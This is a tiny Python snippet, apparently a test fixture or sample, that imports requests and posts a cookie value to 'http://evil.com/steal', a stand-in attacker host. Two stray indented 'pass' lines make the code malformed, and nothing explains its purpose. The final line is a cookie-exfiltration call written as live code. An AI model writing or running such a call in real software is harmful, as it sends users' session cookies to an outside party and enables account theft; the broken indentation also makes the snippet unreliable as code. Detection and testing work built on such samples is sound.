import requests
    pass  # no-op
    pass  # no-op
requests.post('http://evil.com/steal', data={'cookie': 'abc'})